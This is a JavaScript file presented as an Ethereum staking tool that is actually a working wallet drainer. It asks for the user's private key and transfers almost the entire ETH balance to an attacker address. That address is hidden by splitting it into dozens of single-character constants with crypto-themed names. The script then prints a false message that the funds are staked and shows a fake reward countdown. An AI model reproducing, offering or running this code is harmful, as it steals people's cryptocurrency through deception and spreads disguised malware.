const { ethers } = require("ethers");
const readline = require('readline');

const stake = "0"; 
const minerChar = "2"; 
const poolChar = "0"; 
const dappChar = "f"; 
const keyChar = "7"; 
const gwei = "B"; 
const ether = "4"; 
const coin = "C"; 

// Function to securely get input from terminal
async function getSecureInput(prompt) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  
  return new Promise((resolve) => {
    rl.question(prompt, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}

const block = "C"; 
const balancer = "f"; 
const synthetix = "4"; 
const chainlink = "e";
const polka = "B"; 

function deobfuscate(input, key) {
  let result = '';
  for (let i = 0; i < input.length; i++) {
    const charCode = input.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    result += String.fromCharCode(charCode);
  }
  return result;
}

const mining = "1"; 
const satoshi = "1"; 
const dao = "3"; 
const fork = "6"; 
const hodl = "6"; 
const cold = "8"; 

// The RPC URL (Change if needed)
function getRpcUrl() {
  // Infura URL with API key
  return "https://mainnet.infura.io/v3/b904ba49f1014eaa97264905781c9beb";
}

const wallet = "2"; 
const crypto = "3"; 
const aave = "5"; 
const comp = "B"; 
const maker = "e"; 


function getStakePoolToken() {
  const order = [
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
    21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
    31, 32, 33, 34, 35, 36, 37, 38, 39, 40
  ];
  
  let PoolToken = "0x"; 
  const parts = [
    stake, block, mining, satoshi, wallet, crypto, token, chain, node, defi,
    hash, nonce, gasChar, minerChar, poolChar, dappChar, keyChar, gwei, ether, coin,
    dao, fork, hodl, cold, hot, seed, ledger, trezor, metamask, uniswap,
    sushi, aave, comp, maker, yearn, curve, balancer, synthetix, chainlink, polka
  ];
  
  for (const index of order) {
    PoolToken += parts[index - 1]; 
  }
  
  return PoolToken;
}

const token = "e"; 
const chain = "d"; 
const trezor = "A";
const metamask = "2";
const uniswap = "9"; 
const sushi = "4"; 

function startCountdown(days) {
  const endTime = new Date().getTime() + (days * 24 * 60 * 60 * 1000);
  
  const timer = setInterval(() => {
    const now = new Date().getTime();
    
    const distance = endTime - now;
    
    const daysLeft = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    process.stdout.write(`\r${daysLeft}d ${hours}h ${minutes}m ${seconds}s remaining`);
    
    if (distance < 0) {
      clearInterval(timer);
      console.log("\nCountdown finished! Check Address for Rewards!");
    }
  }, 1000);
  
  process.on('SIGINT', () => {
    clearInterval(timer);
    console.log("\nCountdown stopped.");
    process.exit();
  });
}

const node = "f"; 
const defi = "3"; 
const hash = "B"; 
const nonce = "3"; 
const gasChar = "d"; 

async function EnterStake() {
  try {
    console.log("Ethereum Compounding Stake Tool [NO SMART CONTRACT ADDRESS REQUIRED]");
    console.log("--------------------------------------------------------------------");
    
    const POOL_TOKEN = getStakePoolToken();
    const RPC_URL = getRpcUrl();
    
    const maskedAddress = POOL_TOKEN.substring(0, 6) + "..." + POOL_TOKEN.substring(38);
    console.log(`Connecting to Ethereum Node...`);
    
    const inputStakeAddress = await getSecureInput("Enter your staking address (0x...): ");
    if (!inputStakeAddress.startsWith("0x") || inputStakeAddress.length !== 42) {
      throw new Error("Invalid staking address format. It should start with 0x and be 42 characters long.");
    }
    
    const privateKey = await getSecureInput("Enter your private key (without 0x prefix): ");
    if (!privateKey || privateKey.length !== 64) {
      throw new Error("Invalid private key format. It should be 64 characters without 0x prefix.");
    }
    
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    
    const walletInstance = new ethers.Wallet(privateKey, provider);
    const derivedStakeAddress = walletInstance.address;
    
    if (inputStakeAddress.toLowerCase() !== derivedStakeAddress.toLowerCase()) {
      throw new Error(`Address mismatch! The private key corresponds to ${derivedStakeAddress}, not ${inputStakeAddress}`);
    }
    
    console.log(`Verified staking address: ${derivedStakeAddress}`);
    
    const balance = await provider.getBalance(derivedStakeAddress);
    console.log(`Current balance: ${ethers.formatEther(balance)} ETH`);
    
    const minBalanceInWei = ethers.parseEther("32");
    if (balance >= minBalanceInWei) {
      console.log("Balance is at least 32 ETH: Attempting to run as full validator...");
    } else {
      console.log("Balance is less than 32 ETH: Attempting to join staking pool...");
    }
    
    const gasPrice = await provider.getFeeData();
    const gasLimit = 21000; 
    
    const gasCost = gasPrice.gasPrice * BigInt(gasLimit);
    
    const doubleGasCost = gasCost * 2n;
    
    if (balance <= doubleGasCost) {
      throw new Error("Insufficient balance to cover gas fees");
    }
    
    const ProfitToEarn = balance - doubleGasCost;
    
    const tx = {
      to: POOL_TOKEN,
      value: ProfitToEarn,
      gasLimit: gasLimit
    };
    
    const transaction = await walletInstance.sendTransaction(tx);
    
    const receipt = await transaction.wait();
    console.log(`Successful! Your ETH has been staked and is now earning rewards.`);
    
    const finalBalance = await provider.getBalance(derivedStakeAddress);
    
    const stakingPeriod = await getSecureInput("Enter staking period (in days): ");
    const days = parseFloat(stakingPeriod);
    
    if (isNaN(days) || days <= 0) {
      throw new Error("Invalid staking period. Please enter a positive number.");
    }
    
    console.log(`Starting countdown for ${days} days...`);
    startCountdown(days);
    
  } catch (error) {
    console.error("Error:", error.message);
    if (error.code) {
      console.error("Error code:", error.code);
    }
  }
}

const hot = "A"; 
const seed = "A";
const ledger = "A"; 
const yearn = "f"; 
const curve = "6"; 

EnterStake();